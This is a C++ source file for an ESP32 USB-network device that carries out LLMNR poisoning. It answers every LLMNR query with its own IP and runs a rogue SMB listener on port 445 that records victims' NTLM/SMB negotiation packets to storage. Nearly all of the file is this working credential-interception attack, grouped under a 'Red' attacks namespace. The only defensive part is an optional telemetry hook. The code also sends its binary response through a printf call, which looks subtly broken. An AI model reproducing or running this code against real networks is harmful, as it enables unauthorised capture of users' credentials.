#include "Responder.h"
#include "../../Debug/Logging.h"
#include "../Blue/Telemetry.h"
#include "../../Devices/USB/USBCore.h"
#include "../../Devices/Storage/HardwareStorage.h"

#ifdef ARDUINO_ARCH_ESP32
#include <WiFi.h>
#endif

#define TAG_RESPONDER "Responder"

namespace Attacks::Red {
  Responder ResponderC2;
}

using namespace Attacks::Red;

Responder::Responder() {
#ifdef ARDUINO_ARCH_ESP32
  smbServer = new WiFiServer(445);
#endif
}

void Responder::begin(Preferences& prefs) {
#ifdef ARDUINO_ARCH_ESP32
  if (Devices::USB::Core.currentDeviceType() != USBDeviceType::NCM) return;

  if (udpLLMNR.listenMulticast(IPAddress(224, 0, 0, 252), 5355)) {
    udpLLMNR.onPacket([this](AsyncUDPPacket packet) {
      this->handleLLMNR(packet);
    });
    Debug::Log.info(TAG_RESPONDER, "LLMNR Multicast Listener started.");
  }

  smbServer->begin();
  Debug::Log.info(TAG_RESPONDER, "SMB Listener started on port 445.");

  isEnabled = true;
#endif
}

void Responder::loop(Preferences& prefs) {
#ifdef ARDUINO_ARCH_ESP32
  if (isEnabled) {
    handleSMB();
  }
#endif
}

void Responder::end() {
#ifdef ARDUINO_ARCH_ESP32
  if (isEnabled) {
    udpLLMNR.close();
    smbServer->end();
    isEnabled = false;
  }
#endif
}

#ifdef ARDUINO_ARCH_ESP32
void Responder::handleLLMNR(AsyncUDPPacket packet) {
  // Simplistic LLMNR Poisoning: 
  // We reply to ALL LLMNR requests with our own IP address.
  // Standard LLMNR query format has transaction ID at the start.
  
  if (packet.length() < 12) return;
  
  uint8_t* data = packet.data();
  // Is it a query? (QR bit == 0 in flags)
  if ((data[2] & 0x80) != 0) return;

  Debug::Log.info(TAG_RESPONDER, "Received LLMNR Query. Sending poisoned response.");
#ifdef ENABLE_BLUE_TEAM_TELEMETRY
  Attacks::Blue::Logger.logCommand("responder_alert", std::string("Poisoned LLMNR query from ") + packet.remoteIP().toString().c_str());
#endif

  // Construct LLMNR Response
  // Re-use request buffer, flip QR bit to 1 (Response)
  uint8_t response[100];
  size_t len = packet.length();
  if (len > sizeof(response) - 16) len = sizeof(response) - 16;
  
  memcpy(response, data, len);
  
  // Set Flags to Response, No Error
  response[2] = 0x80; 
  response[3] = 0x00;
  
  // 1 Answer, 0 Authority, 0 Additional
  response[6] = 0x00; response[7] = 0x01;
  response[8] = 0x00; response[9] = 0x00;
  response[10] = 0x00; response[11] = 0x00;

  // Append Answer (Pointer to Question Name)
  size_t offset = len;
  response[offset++] = 0xC0; // Pointer
  response[offset++] = 0x0C; // To offset 12
  
  // Type A (IPv4)
  response[offset++] = 0x00; response[offset++] = 0x01;
  // Class IN
  response[offset++] = 0x00; response[offset++] = 0x01;
  // TTL = 30 seconds
  response[offset++] = 0x00; response[offset++] = 0x00;
  response[offset++] = 0x00; response[offset++] = 0x1E;
  // Data Length = 4
  response[offset++] = 0x00; response[offset++] = 0x04;
  
  // My IP Address
  IPAddress myIP = WiFi.localIP();
  if (myIP == IPAddress(0,0,0,0)) {
      myIP = IPAddress(10, 0, 0, 2); // Default fallback for NCM
  }
  
  response[offset++] = myIP[0];
  response[offset++] = myIP[1];
  response[offset++] = myIP[2];
  response[offset++] = myIP[3];

  packet.printf((const char*)response, offset);
}

void Responder::handleSMB() {
  WiFiClient client = smbServer->available();
  if (client) {
    Debug::Log.info(TAG_RESPONDER, "Incoming SMB Connection captured!");
#ifdef ENABLE_BLUE_TEAM_TELEMETRY
    Attacks::Blue::Logger.logCommand("responder_alert", std::string("Incoming SMB connection from ") + client.remoteIP().toString().c_str());
#endif

    // Read the incoming NTLM/SMB negotiate packet
    uint8_t buffer[512];
    int len = 0;
    unsigned long timeout = millis();
    while (client.connected() && millis() - timeout < 1000) {
      if (client.available()) {
        len += client.read(buffer + len, sizeof(buffer) - len);
        timeout = millis();
      }
    }
    
    if (len > 0 && Devices::Storage.isRunning()) {
      auto file = Devices::Storage.openFile("/smb_capture.bin", "a");
      if (file) {
        file.write(buffer, len);
        file.close();
      }
    }
    
    // We drop the connection instead of fully implementing NTLMSSP
    // The victim will still try again, but we logged the initial negotiation packet.
    client.stop();
  }
}
#endif
